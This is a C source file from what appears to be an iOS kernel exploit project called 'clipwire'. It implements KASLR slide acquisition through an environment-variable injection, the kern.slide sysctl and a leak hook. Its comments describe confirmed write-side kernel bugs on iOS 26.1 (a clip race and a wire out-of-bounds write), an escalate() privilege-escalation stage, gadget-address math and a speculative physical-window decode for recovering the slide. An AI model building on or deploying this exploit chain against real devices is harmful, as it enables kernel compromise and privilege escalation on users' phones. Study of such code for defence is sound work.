#include "clipwire.h"

/* Kernel slide acquisition.
 *
 * Sources, in priority order:
 *   1. CLIPWIRE_SLIDE env var (hex) - on-device development injection.
 *      Lets the full chain (gadget-address math, escalate()) be tested
 *      before an info leak is wired up.
 *   2. kern.slide sysctl (root / development images).
 *   3. leak_slide() info-leak hook (sysctl today; the phys-scan in
 *      krw.c supersedes it once the wire primitive is live).
 *
 * With slide == 0 the exploit runs in primitive-validation mode: it
 * establishes and reports the clip corruption + wire OOB and exits
 * cleanly, without touching slide-dependent kernel addresses.
 */

static U64 parse_hex(const char *s)
{
    U64 v = 0;
    if (!s) return 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    for (; *s; s++) {
        char c = *s;
        if (c >= '0' && c <= '9') v = (v << 4) | (U64)(c - '0');
        else if (c >= 'a' && c <= 'f') v = (v << 4) | (U64)(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') v = (v << 4) | (U64)(c - 'A' + 10);
        else return 0;
    }
    return v;
}

U64 kern_slide_from_sysctl(void)
{
    uint64_t slide = 0;
    size_t len = sizeof(slide);
    if (sysctlbyname("kern.slide", &slide, &len, NULL, 0) == 0) {
        LOGOK("kern.slide via sysctl: %#llx", slide);
        return slide;
    }
    return 0;
}

/* Pluggable kernel slide leak.
 *
 * This is the one stage that still requires an info leak. On iOS 26.1 the
 * confirmed bugs in this project are write-side (clip race + wire OOB), so
 * the slide must come from elsewhere:
 *
 *   1. An info leak (not part of this project) - leak a kernel pointer out
 *      of a task/object reachable from the app sandbox and subtract its
 *      static address. Not yet reverse engineered.
 *
 *   2. A phys-window decode of Bug 1's corrupted entry: the object field
 *      (entry+0x38 upper 32b) decodes into 0xffffffdc00000000 phys window.
 *      If we can force that decode to land on a kernel-data phys page we know,
 *      the phys->virt difference reveals the kernel map offset. Speculative.
 *
 *   3. kern.slide sysctl (root / development images only).
 *
 * Until the leak is pinned this returns 0 and the exploit runs in
 * primitive-validation mode (slide-independent).
 */
U64 leak_slide(void)
{
    U64 s = 0;

    s = kern_slide_from_sysctl();
    if (s) return s;

    LOGWARN("no kernel slide source available - falling back to slide=0");
    LOGWARN("(needs an info leak or kern.slide)");
    return 0;
}

U64 get_kernel_slide(void)
{
    U64 slide = 0;

    const char *env = getenv("CLIPWIRE_SLIDE");
    if (env && *env) {
        slide = parse_hex(env);
        if (slide) {
            LOGOK("kernel slide injected via CLIPWIRE_SLIDE: %#llx", slide);
            return slide;
        }
    }

    return leak_slide();
}
